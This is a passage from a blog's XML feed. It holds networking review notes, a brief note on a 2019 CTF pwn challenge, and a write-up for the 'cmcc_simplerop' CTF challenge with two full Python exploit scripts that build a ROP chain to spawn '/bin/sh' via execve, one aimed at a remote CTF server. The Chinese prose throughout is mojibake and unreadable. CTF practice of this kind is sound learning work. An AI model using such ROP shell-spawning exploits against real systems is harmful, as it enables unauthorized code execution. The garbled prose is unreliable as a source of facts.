id="OISä¸ƒå±‚æ¨¡å‹"><a href="#OISä¸ƒå±‚æ¨¡å‹" class="headerlink" title="OISä¸ƒå±‚æ¨¡å‹"></a>OISä¸ƒå±‚æ¨¡å‹</h2><table><thead><tr><th align="center">å±‚æ¬¡</th><th align="center">åç§°</th><th align="center">åŠŸèƒ½</th></tr></thead><tbody><tr><td align="center">åº”ç”¨å±‚</td><td align="center">æŠ¥æ–‡/æ¶ˆæ¯</td><td align="center"></td></tr><tr><td align="center">è¡¨ç¤ºå±‚</td><td align="center"></td><td align="center">å®šä¹‰æ•°æ®æ ¼å¼å’ŒåŠ å¯†æ ‡å‡†ã€‚å°†ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼</td></tr><tr><td align="center">ä¼šè¯å±‚</td><td align="center"></td><td align="center">éªŒè¯ä¼šè¯åŒæ–¹ï¼Œæä¾›èº«ä»½éªŒè¯</td></tr><tr><td align="center">ä¼ è¾“å±‚</td><td align="center">æ®µ</td><td align="center">ç½‘ç»œèŠ‚ç‚¹ä¹‹é—´çš„å¯é æ•°æ®ä¼ è¾“</td></tr><tr><td align="center">ç½‘ç»œå±‚</td><td align="center">åŒ…</td><td align="center"></td></tr><tr><td align="center">é“¾è·¯å±‚</td><td align="center">å¸§</td><td align="center"></td></tr><tr><td align="center">ç‰©ç†å±‚</td><td align="center">æµ</td><td align="center"></td></tr></tbody></table><h2 id="TCP-IPå››å±‚"><a href="#TCP-IPå››å±‚" class="headerlink" title="TCP/IPå››å±‚"></a>TCP/IPå››å±‚</h2><table><thead><tr><th>å±‚æ¬¡</th><th></th><th></th></tr></thead><tbody><tr><td>åº”ç”¨å±‚</td><td></td><td></td></tr><tr><td>ä¼ è¾“å±‚</td><td>æä¾›ç«¯åˆ°ç«¯é€šä¿¡</td><td></td></tr><tr><td>ç½‘ç»œå±‚</td><td>IPæ•°æ®åŒ…ä¼ è¾“ã€è·¯ç”±é€‰æ‹©ã€æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶</td><td></td></tr><tr><td>ç½‘ç»œæ¥å£å±‚</td><td></td><td></td></tr></tbody></table><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164157071.png" class="" title="image-20200104164157071"><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104164216242.png" class="" title="image-20200104164216242"><h2 id="è®°å¿†"><a href="#è®°å¿†" class="headerlink" title="è®°å¿†"></a>è®°å¿†</h2><p>ä»¥å¤ªç½‘MTUæœ€å¤§ä¼ è¾“å•å…ƒï¼Œæœ€å¤§å€¼1500å­—èŠ‚</p><p>åŸºæœ¬æ¦‚å¿µï¼šåè®®ï¼Œå°è£…ï¼ŒæœåŠ¡ï¼Œæ¥å£</p><p>IEEE802.3 CSMA/CD æ€»çº¿åª’ä½“è®¿é—®</p><p>802.4 ä»¤ç‰Œæ€»çº¿</p><p>802.5 ä»¤ç‰Œç¯</p><h2 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h2><p>é€»è¾‘é“¾è·¯æ§åˆ¶å­å±‚</p><p>ä»‹è´¨è®¿é—®æ§åˆ¶å­å±‚</p><h2 id="MACå¯»å€"><a href="#MACå¯»å€" class="headerlink" title="MACå¯»å€"></a>MACå¯»å€</h2><p>å¹¿æ’­å¸§ï¼šç›®çš„MACä¸ºå¹¿æ’­åœ°å€ï¼ˆå…¨1ï¼‰</p><h2 id="Ethernet-IIå¸§æ ¼å¼"><a href="#Ethernet-IIå¸§æ ¼å¼" class="headerlink" title="Ethernet IIå¸§æ ¼å¼"></a>Ethernet IIå¸§æ ¼å¼</h2><h2 id="è®°å¿†-1"><a href="#è®°å¿†-1" class="headerlink" title="è®°å¿†"></a>è®°å¿†</h2><p>äº¤æ¢æœºå·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚</p><p>å†²çªåŸŸï¼šæ¯ä¸ªèŠ‚ç‚¹éƒ½èƒ½æ¥æ”¶åˆ°æ‰€æœ‰è¢«å‘é€çš„å¸§</p><p>å¹¿æ’­åŸŸï¼šèƒ½æ¥æ”¶ä»»ä¸€å‘å‡ºçš„å¹¿æ’­</p><p>è·¯ç”±å™¨éš”ç»å¹¿æ’­</p><p>ç½‘æ¡¥ï¼šæœ‰ä¸¤ç½‘å¡ï¼Œæ¥ä¸¤ç«¯çº¿ç¼†</p><p>é“¾è·¯å±‚åè®®ï¼šIEEE802.3 .4 .5 SLIP(ä¸²è¡Œçº¿è·¯Internetåè®®)ï¼ŒCSLIP()ï¼ŒPPP(ç‚¹å¯¹ç‚¹)</p><p>SLIPï¼šéœ€è¦å…ˆçŸ¥é“ipï¼Œå¹¶ä¸”æ²¡æœ‰æ ¡éªŒ</p><p>ARPå’ŒRARP</p><p>é™æ€æ˜ å°„ï¼šé€šè¿‡åœ°å€æ˜ å°„è¡¨ä¸ç‰©ç†åœ°å€ä¹‹é—´çš„æ˜ å°„</p><p>åŠ¨æ€æ˜ å°„ï¼šè‡ªåŠ¨ç»´æŠ¤é€»è¾‘åœ°å€å’Œç‰©ç†åœ°å€</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>å¹¿æ’­è¯·æ±‚ï¼Œå•æ’­ç›¸åº”</p><p>ç‰©ç†å±‚å¹¿æ’­ï¼ŒIPè·¯ç”±ï¼ˆç½‘ç»œå±‚ï¼‰ä¸ä¼šè½¬å‘</p><h3 id="è·¨å­ç½‘çš„åœ°å€è§£æ"><a href="#è·¨å­ç½‘çš„åœ°å€è§£æ" class="headerlink" title="è·¨å­ç½‘çš„åœ°å€è§£æ"></a>è·¨å­ç½‘çš„åœ°å€è§£æ</h3><p>ï¼Ÿï¼Ÿ</p><h2 id="è®°å¿†-2"><a href="#è®°å¿†-2" class="headerlink" title="è®°å¿†"></a>è®°å¿†</h2><p>è‹¥åˆ†é…dhcpåˆ°çš„ipä¸º169.254å¼€å¤´ï¼Œè¯´æ˜dhcpæœåŠ¡æœ‰é—®é¢˜</p><p>åˆ†ç‰‡æ•°æ®å¤§å°å¿…é¡»ä¸º8å­—èŠ‚çš„æ•´æ•°å€ï¼Œå¦åˆ™æ— æ³•è¡¨è¿°åç§»é‡</p><p>åŠŸèƒ½</p><ul><li>æŠ¥å‘Šå·®é”™</li><li>æŸ¥è¯¢</li></ul><h2 id="å·®é”™æŠ¥æ–‡"><a href="#å·®é”™æŠ¥æ–‡" class="headerlink" title="å·®é”™æŠ¥æ–‡"></a>å·®é”™æŠ¥æ–‡</h2><p>å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ï¼šå½“è·¯ç”±å™¨æˆ–ç›®çš„ä¸»æœºå¤„ç†IPæ•°æ®æŠ¥é‡åˆ°é—®é¢˜æ—¶ï¼ŒæŸ¥è¯¢æŠ¥æ–‡ä»¥è¯·æ±‚/åº”ç­”å½¢å¼æˆå¯¹å‡ºç°</p><p>å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ï¼šæºæŠ‘åˆ¶ æºç«™æŠ‘åˆ¶æŠ¥å‘Šï¼Œé™ä½æºå‘åŒ…é€Ÿåº¦</p><p>ç›®çš„ä¸å¯è¾¾ï¼šç½‘ç»œä¸å¯è¾¾ï¼Œä¸»æœºä¸å¯è¾¾ï¼Œåè®®ä¸å¯è¾¾å’Œç«¯å£ä¸å¯è¾¾</p><p>ç½‘ç»œä¸å¯è¾¾å¯èƒ½è·¯ç”±è¡¨æˆ–è€…ç›®çš„åœ°å€æœ‰é”™ã€‚ä¸»æœºä¸å¯è¾¾å¯èƒ½ä¿¡å®¿æœºä¸åœ¨è¿è¡Œä¸­æˆ–ä¸å­˜åœ¨ï¼Œå¹¶è¯´æ˜ç½‘ç»œå¯è¾¾ã€‚</p><h3 id="è¶…æ—¶"><a href="#è¶…æ—¶" class="headerlink" title="è¶…æ—¶"></a>è¶…æ—¶</h3><p>ç›®çš„ä¸»æœºè¿›è¡Œåˆ†ç‰‡é‡ç»„æ—¶ä¼šå¯åŠ¨é‡ç»„è®¡æ—¶å™¨ï¼Œä¸€æ—¦è¶…æ—¶å°±ä¼šä¸¢å¼ƒæ­£åœ¨é‡ç»„çš„æ•°æ®æŠ¥ï¼Œå¹¶äº§ç”ŸICMPæ•°æ®æŠ¥è¶…æ—¶æŠ¥å‘Š </p><h3 id="é‡å®šå‘æŠ¥æ–‡"><a href="#é‡å®šå‘æŠ¥æ–‡" class="headerlink" title="é‡å®šå‘æŠ¥æ–‡"></a>é‡å®šå‘æŠ¥æ–‡</h3><p>è·¯ç”±æ”¶åˆ°æŠ¥æ–‡åï¼Œåˆ¤æ–­æ˜¯å¦æœ€ä½³é€‰æ‹©ï¼Œä¸æ˜¯å°±å‘é€é‡å®šå‘æŠ¥æ–‡ï¼Œé€šçŸ¥æºä¸»æœºä¿®æ”¹è·¯ç”±è¡¨ï¼Œæœ€ä½³ä¸‹ä¸€è·³è·¯ç”±å™¨çš„IPåœ°å€</p><h3 id="è®¡ç®—åº”ç­”æ—¶é—´"><a href="#è®¡ç®—åº”ç­”æ—¶é—´" class="headerlink" title="è®¡ç®—åº”ç­”æ—¶é—´"></a>è®¡ç®—åº”ç­”æ—¶é—´</h3><img src="/2020/02/08/TCPIP%E5%A4%8D%E4%B9%A0/image-20200104202342626.png" class="" title="image-20200104202342626"><h2 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h2><p>pingå’Œtracert</p><p>##RIP è·ç¦»å‘é‡è·¯ç”±åè®®</p><p>==é€šè¿‡åº¦é‡å€¼åˆ¤æ–­è·¯å¾„çš„å¥½å==</p><p>åŒ…å«ï¼šè·¯å¾„é•¿åº¦ï¼Œè·³æ•°ï¼Œå¯é æ€§ï¼Œå»¶è¿Ÿï¼Œå¸¦å®½ï¼Œè´Ÿè½½ï¼Œé€šè®¯è´¹ç”¨</p><p>RIP V1 ä¸æ”¯æŒVLSM V2 æ”¯æŒè®¤è¯</p><h2 id="OSPF-é“¾è·¯çŠ¶æ€è·¯ç”±åè®®"><a href="#OSPF-é“¾è·¯çŠ¶æ€è·¯ç”±åè®®" class="headerlink" title="OSPF é“¾è·¯çŠ¶æ€è·¯ç”±åè®®"></a>OSPF é“¾è·¯çŠ¶æ€è·¯ç”±åè®®</h2><p>==é€šè¿‡ç®¡ç†è·ç¦»åˆ¤æ–­è·¯å¾„å¥½å==</p><p>æ¯ç§è·¯å¾„ç”±åè®®åˆ†é…ä¿¡ä»»ç­‰çº§ï¼Œæ ¹æ®ç®—æ³•çš„å¥½å</p><h2 id="BGPåè®®"><a href="#BGPåè®®" class="headerlink" title="BGPåè®®"></a>BGPåè®®</h2><p>è¾¹ç•Œç½‘å…³åè®®ï¼Œç”¨äºè‡ªæ²»ç³»ç»Ÿä¹‹é—´</p><p>å°äº1024ç«¯å£åšå…¬ç”¨ç«¯å£ï¼Œå…¨å±€æ–¹å¼è¿›è¡Œåˆ†é…</p><p>1024ï½65535 ä¸´æ—¶ç«¯å£</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>é¢å‘å­—èŠ‚æµã€‚TCPä½¿ç”¨ç¼“å†²åŒº</p><h3 id="ä¸‰æ¬¡æ¡æ‰‹"><a href="#ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="ä¸‰æ¬¡æ¡æ‰‹"></a>ä¸‰æ¬¡æ¡æ‰‹</h3><p>SEQ æ˜¯éšæœºæ•°</p><p>å®¢æˆ·ç«¯</p><p>ç¬¬ä¸€æ¬¡ï¼šSEQ = m , SYN = 1</p><p>æœåŠ¡å™¨</p><p>ç¬¬äºŒæ¬¡ï¼šSEQ = nï¼ŒAN = m + 1ï¼ŒSYN=1ï¼ŒACK=1</p><p>å®¢æˆ·ç«¯</p><p>ç¬¬ä¸‰æ¬¡ï¼šSEQ = m + 1 , AN = n +1 , ACK = 1</p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>é¢å‘æŠ¥æ–‡ ä½¿ç”¨é˜Ÿåˆ—</p><p>169.254 æœ¬åœ°é“¾è·¯åœ°å€</p><h2 id="DHCPæŠ¥æ–‡æ ¼å¼"><a href="#DHCPæŠ¥æ–‡æ ¼å¼" class="headerlink" title="DHCPæŠ¥æ–‡æ ¼å¼"></a>DHCPæŠ¥æ–‡æ ¼å¼</h2><p>ç½‘å…³IPåœ°å€ å¦‚æœè·¨ç½‘æ®µä½¿ç”¨DHCPä¸­ç»§ï¼Œæ­¤å­—æ®µåŒ…å«ä¸­ç»§ä»£ç†çš„ipåœ°å€</p><p>windowsåŸŸ WINSåè®®</p><p>DNSé€’å½’è§£æï¼Œåå‘è§£æ</p>]]></content>
    
    
    <categories>
      
      <category>ä¸“ä¸šå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¸“ä¸šå­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯2019_æ‹Ÿæ€-STKOF</title>
    <link href="/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/"/>
    <url>/2020/02/08/%E5%BC%BA%E7%BD%91%E6%9D%AF2019_%E6%8B%9F%E6%80%81-STKOF/</url>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜ç»™äº†ä¸¤æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯32å’Œ64ä½çš„ï¼Œ32ä½çš„ç”±äºæ˜¯é™æ€é“¾æ¥ï¼Œç›´æ¥è‡ªåŠ¨ç”Ÿæˆå°±èƒ½æ‰“é€šã€‚</p><p>æ‰“åˆ°buuæœåŠ¡å™¨ä¸Šæ—¶ï¼Œexpæ˜¯éšæœºæ‰“åˆ°ä¸¤ä¸ªç¨‹åºä¸­çš„ä¸€ä¸ªçš„ï¼Œå°±æˆ‘æµ‹è¯•æ¥çœ‹64ä½çš„å‡ºç°å¤šç‚¹</p><p>æœäº†ä¸€æœï¼Œå½“æ—¶æ¯”èµ›å¥½åƒæ˜¯è¦ä¸€ä¸ªexpæ‰“é€šä¸¤ä¸ªç¨‹åºæ‰è¡Œ</p><p>å¤‡ä»½å­¦ä¹ é“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/qq_41071646/article/details/90607928">å¼ºç½‘æ¯ ç­¾åˆ°re ç­¾åˆ°pwn é¢˜è§£</a></p><p><a href="https://www.anquanke.com/post/id/195801?from=singlemessage">æ‹Ÿæ€é˜²å¾¡å‹Pwné¢˜åšé¢˜æ€è·¯æ€»ç»“</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget&amp;ç³»ç»Ÿè°ƒç”¨-cmcc_simplerop</title>
    <link href="/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/"/>
    <url>/2020/02/08/ROPgadget&amp;%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/</url>
    
    <content type="html"><![CDATA[<img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141031239.png" class="" title="image-20200204141031239"><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141049853.png" class="" title="image-20200204141049853"><p>ç¬¬ä¸€ååº”å°±æ˜¯ç”¨ROPgadgetè‡ªåŠ¨ç”Ÿæˆropchains</p><p>ä½†åœ¨è¿™é‡Œä¸è¡Œï¼Œç®—å‡ºæ¥çš„åç§»æ˜¯0x20ï¼Œé‚£ä¹ˆåªæœ‰68å­—èŠ‚ç»™ropchainsäº†</p><img src="/2020/02/08/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/image-20200204141245719.png" class="" title="image-20200204141245719"><p>è€Œè‡ªåŠ¨ç”Ÿæˆçš„éƒ½å¤ªé•¿äº†= =ï¼Œåªèƒ½æ‰‹åŠ¨è°ƒæ•´ropchainsé•¿åº¦</p><blockquote><p>å‚è€ƒ<a href="http://m4x.fun/post/hitcon-training-writeup/">http://m4x.fun/post/hitcon-training-writeup/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806e850</span><br>payload = cyclic(<span class="hljs-number">0x14</span> + <span class="hljs-number">12</span>) <br><br>p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br><br>rop = <span class="hljs-string">&#x27;&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += p(<span class="hljs-number">0</span>)<br>rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>rop += p(<span class="hljs-number">0x0000000b</span>)<br>rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret;</span><br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)<br>        <span class="hljs-comment">#lib = ELF(&#x27;&#x27;)</span><br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        <span class="hljs-comment">#lib = ELF(&#x27;./home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&#x27;)</span><br>    <span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack <br><br>    pop_edx_ecx_ebx = <span class="hljs-number">0x0806e850</span><br>    payload = cyclic(<span class="hljs-number">0x14</span> + <span class="hljs-number">12</span>) <br><br>    p = <span class="hljs-keyword">lambda</span> x : pack(<span class="hljs-string">&#x27;I&#x27;</span>, x)<br>    IMAGE_BASE_0 = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># ./simplerop</span><br>    rebase_0 = <span class="hljs-keyword">lambda</span> x : p(x + IMAGE_BASE_0)<br><br>    rop = <span class="hljs-string">&#x27;&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += <span class="hljs-string">&#x27;/bin&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>    rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += <span class="hljs-string">&#x27;/sh\x00&#x27;</span><br>    rop += rebase_0(<span class="hljs-number">0x0002682a</span>) <span class="hljs-comment"># 0x0806e82a: pop edx; ret; </span><br>    rop += rebase_0(<span class="hljs-number">0x000a3064</span>)<br>    rop += rebase_0(<span class="hljs-number">0x0005215d</span>) <span class="hljs-comment"># 0x0809a15d: mov dword ptr [edx], eax; ret;</span><br>    rop += pack(<span class="hljs-string">&#x27;I&#x27;</span>, pop_edx_ecx_ebx)<br>    rop += p(<span class="hljs-number">0</span>)<br>    rop += p(<span class="hljs-number">0</span>)<br>    rop += rebase_0(<span class="hljs-number">0x000a3060</span>)<br>    rop += rebase_0(<span class="hljs-number">0x00072e06</span>) <span class="hljs-comment"># 0x080bae06: pop eax; ret; </span><br>    rop += p(<span class="hljs-number">0x0000000b</span>)<br>    rop += rebase_0(<span class="hljs-number">0x00026ef0</span>) <span class="hljs-comment"># 0x0806eef0: int 0x80; ret; </span><br>    <br>    sh.sendline(payload + rop)<br><br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25335</span>,<span class="hljs-number">0</span> )<br></code></pre></td></tr></table></figure><h2 id="å¦ä¸€ç§è§£æ³•"><a href="#å¦ä¸€ç§è§£æ³•" class="headerlink" title="å¦ä¸€ç§è§£æ³•"></a>å¦ä¸€ç§è§£æ³•</h2><blockquote><p>æ–°å§¿åŠ¿ &gt;rop chainå int 0x80ä¸­æ–­ä»è€Œæ‰§è¡Œç³»ç»Ÿè°ƒç”¨&gt; execve(/bin/sh)ã€‚</p><p>åŸç†ï¼šé€šè¿‡ä¸€ç³»åˆ— pop|ret ç­‰gadgetï¼Œä½¿å¾— eax = 0xbï¼ˆexecve 32 ä½ä¸‹çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œebx -&gt; /bin/shï¼Œ ecx = edx = 0ï¼Œç„¶åé€šè¿‡ int 0x80 å®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰§è¡Œ execve(â€œ/bin/shâ€, 0, 0)<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€ŒYof3ngã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_40173126/article/details/83348870">https://blog.csdn.net/qq_40173126/article/details/83348870</a></p><p>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€ŒYof3ngã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>[åŸæ–‡é“¾æ¥])(<a href="https://blog.csdn.net/qq_40173126/article/details/83348870">https://blog.csdn.net/qq_40173126/article/details/83348870</a>)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*  <br>p = process(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./simplerop&#x27;</span>)  <br>  <br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eca0</span>  <br>pop_eax = <span class="hljs-number">0x080b7e26</span>  <br>pop_edx = <span class="hljs-number">0x0806ec7a</span>  <br>int_80 = <span class="hljs-number">0x0806c8f5</span>  <br>gadget = <span class="hljs-number">0x080707b9</span> <span class="hljs-comment"># mov word ptr [edx],eax  </span><br>bss = elf.bss()  <br>read_plt = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]  <br>  <br>  <br>p.recv()  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span> + p32(pop_edx) +p32(bss)+ p32(pop_eax) +<span class="hljs-string">&quot;/bin&quot;</span>+ p32(gadget)  <br>payload +=  p32(pop_edx) + p32(bss+<span class="hljs-number">4</span>) + p32(pop_eax) + <span class="hljs-string">&quot;/sh\x00&quot;</span> + p32(gadget)  <br>payload += p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>) + p32(bss) <br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)  <br>payload += p32(int_80)  <br>  <br>p.send(payload)  <br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-ROPgadget -ç³»ç»Ÿè°ƒç”¨å·</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è§£å¯†ç³»åˆ—ç¬”è®°</title>
    <link href="/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/"/>
    <url>/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/</url>
    
